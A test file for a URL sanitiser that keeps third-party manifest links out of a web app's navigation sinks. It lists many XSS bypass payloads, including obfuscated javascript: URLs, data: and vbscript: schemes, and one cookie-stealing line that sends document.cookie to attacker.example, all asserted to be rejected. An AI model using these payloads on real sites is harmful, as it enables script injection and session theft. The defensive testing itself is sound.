// SPDX-License-Identifier: Apache-2.0

/**
 * `safeExternalUrl` — the single guard between third-party-authored URLs
 * (AFPS manifest fields) and the SPA's navigation sinks.
 *
 * The hostile cases below are not decoration: each one is a real bypass of a
 * naive check. `JaVaScRiPt:` beats a lowercase compare, `java\tscript:` beats
 * a literal `startsWith("javascript:")`, a leading NUL/`\x01` beats a trimmed
 * compare, and `//evil.com` beats `startsWith("http")`. They must all be
 * refused, and nothing may throw — a rejected URL is a rendering decision, not
 * an error path.
 */

import { describe, it, expect } from "bun:test";
import { safeExternalUrl } from "../safe-url.ts";

describe("safeExternalUrl — accepted", () => {
  it("accepts https and returns the normalized URL", () => {
    expect(safeExternalUrl("https://github.com/appstrate/appstrate")).toBe(
      "https://github.com/appstrate/appstrate",
    );
  });

  it("accepts http", () => {
    expect(safeExternalUrl("http://example.com/")).toBe("http://example.com/");
  });

  it("preserves query and fragment", () => {
    expect(safeExternalUrl("https://example.com/a?b=1#c")).toBe("https://example.com/a?b=1#c");
  });

  it("normalizes the scheme and host casing but not the path", () => {
    expect(safeExternalUrl("HTTPS://EXAMPLE.COM/Path")).toBe("https://example.com/Path");
  });

  it("accepts an https URL carrying credentials or a port", () => {
    expect(safeExternalUrl("https://example.com:8443/repo")).toBe("https://example.com:8443/repo");
  });
});

describe("safeExternalUrl — javascript: in every disguise", () => {
  const hostile = [
    "javascript:alert(1)",
    "JAVASCRIPT:alert(1)",
    "JaVaScRiPt:alert(1)",
    "Javascript:alert(1)",
    // Embedded whitespace/control characters: the WHATWG parser strips these
    // before reading the scheme, and so does the browser on navigation.
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    "java\rscript:alert(1)",
    "jav\ta\nscr\ript:alert(1)",
    // Leading/trailing C0 controls and spaces, likewise stripped.
    " javascript:alert(1)",
    "  javascript:alert(1)  ",
    "\njavascript:alert(1)",
    "\tjavascript:alert(1)",
    "\u0000javascript:alert(1)",
    "\u0001javascript:alert(1)",
    "javascript:alert(1) ",
    // The confirmed exploit payload from the manifest `repository` field.
    "javascript:fetch('https://attacker.example/'+document.cookie)",
  ];
  for (const value of hostile) {
    it(`rejects ${JSON.stringify(value)}`, () => {
      expect(safeExternalUrl(value)).toBeNull();
    });
  }
});

describe("safeExternalUrl — other dangerous schemes", () => {
  const hostile = [
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "DATA:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "VBScript:msgbox(1)",
    "file:///etc/passwd",
    "blob:https://example.com/1234",
    "about:blank",
    // Not executable, but still not a link target we are willing to mint.
    "mailto:someone@example.com",
    "tel:+33123456789",
    "ftp://example.com/x",
  ];
  for (const value of hostile) {
    it(`rejects ${JSON.stringify(value)}`, () => {
      expect(safeExternalUrl(value)).toBeNull();
    });
  }
});

describe("safeExternalUrl — scheme-relative and relative", () => {
  it('rejects a scheme-relative URL that startsWith("http") would miss', () => {
    expect(safeExternalUrl("//evil.example/repo")).toBeNull();
  });

  it("rejects a scheme-relative URL with a backslash", () => {
    expect(safeExternalUrl("\\\\evil.example/repo")).toBeNull();
  });

  /**
   * Relative values are refused by design, not by accident: these fields
   * describe resources outside the platform, so a relative path would resolve
   * against our own origin and let a publisher dress up a platform URL as
   * their documentation.
   */
  it("rejects an absolute-path relative URL", () => {
    expect(safeExternalUrl("/api/orgs")).toBeNull();
  });

  it("rejects a bare relative URL", () => {
    expect(safeExternalUrl("docs/readme.md")).toBeNull();
  });
});

describe("safeExternalUrl — malformed and non-string input", () => {
  const junk: unknown[] = [
    "",
    "   ",
    "ht tp://example.com",
    "https://",
    ":://",
    "http://",
    undefined,
    null,
    0,
    42,
    true,
    false,
    {},
    [],
    { url: "https://example.com" },
    () => "https://example.com",
    Symbol("https://example.com"),
    123n,
  ];
  for (const value of junk) {
    it(`rejects ${typeof value} ${String(typeof value === "symbol" ? "symbol" : value)} without throwing`, () => {
      expect(() => safeExternalUrl(value)).not.toThrow();
      expect(safeExternalUrl(value)).toBeNull();
    });
  }
});
